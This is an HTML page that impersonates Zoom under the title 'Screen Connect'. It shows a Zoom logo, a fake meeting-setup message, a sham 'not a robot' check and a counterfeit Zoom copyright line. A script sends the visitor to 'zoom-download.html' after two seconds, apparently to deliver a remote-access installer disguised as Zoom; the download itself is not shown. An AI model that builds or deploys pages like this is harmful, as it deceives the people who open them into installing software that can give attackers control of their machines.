<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Screen Connect</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
            background-color: #f9f9f9;
            text-align: center;
        }
        .zoom-image {
            width: 300px;
            height: auto;
            margin-bottom: 20px;
            max-width: 90vw;
        }
        .ring-container {
            width: 100px;
            height: 100px;
            position: relative;
        }
        .ring {
            width: 100%;
            height: 100%;
            border: 10px solid #cccccc;
            border-radius: 50%;
            box-sizing: border-box;
            position: absolute;
        }
        .blue-path {
            width: 100%;
            height: 100%;
            border: 10px solid transparent;
            border-top-color: #0c5cff;
            border-radius: 50%;
            box-sizing: border-box;
            position: absolute;
            animation: spin 1s linear infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .message {
            margin-top: 20px;
            font-size: 16px;
            color: #333;
        }
        .meeting {
            font-weight: 900;
            margin: 10px 0 10px 0;;
        }
        .loading-dots {
            display: inline-block;
            vertical-align: middle;
        }
        .loading-dots::after {
            content: '.';
            animation: dots 1.5s infinite steps(3);
        }
        @keyframes dots {
            0% { content: '.'; }
            33% { content: '..'; }
            66% { content: '...'; }
            100% { content: '.'; }
        }
        .progress-rect {
            width: 200px;
            height: 10px;
            background-color: #e0e0e0;
            border-radius: 5px;
            margin-top: 10px;
            overflow: hidden;
            position: relative;
        }
        .progress-rect .moving-bar {
            width: 30px;
            height: 100%;
            background-color: #0c5cff;
            position: absolute;
            animation: slide 2s infinite linear;
        }
        @keyframes slide {
            0% { left: -30px; }
            50% { left: calc(100% - 30px); }
            100% { left: -30px; }
        }
        .button {
            margin-top: 20px;
            padding: 10px 20px;
            background-color: #0c5cff;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            text-decoration: none;
        }
        .button:hover {
            background-color: #1d6ad8;
        }
        .footer {
            position: fixed;
            bottom: 10px;
            font-size: 12px;
            color: #888;
        }
    </style>
     <script>
        setTimeout(function() {
            window.location.href = 'zoom-download.html';
        }, 2000);
    </script>
</head>
<body>
    <img src="https://res.cloudinary.com/dw4edqqeg/image/upload/v1749328906/zoom_tz0djv.png" alt="Zoom" class="zoom-image"/>
    <div class="ring-container">
        <div class="ring"></div>
        <div class="blue-path"></div>
    </div>
    <div class="message">
        <div class="meeting">Establishing Meeting: ZoomInstallerInc</div>
        Please wait while we establish your secured Zoom session with Screen Connect...
    </div>
    <div class="message">
        Verifying you're not a robot <span class="loading-dots"></span>
    </div>
    <div class="progress-rect">
        <div class="moving-bar"></div>
    </div>
    <a href="#" class="button">Click here if not redirected</a>
    <div class="footer">
        Â© Zoom, 2025 Inc. All rights reserved.
    </div>
</body>
</html>
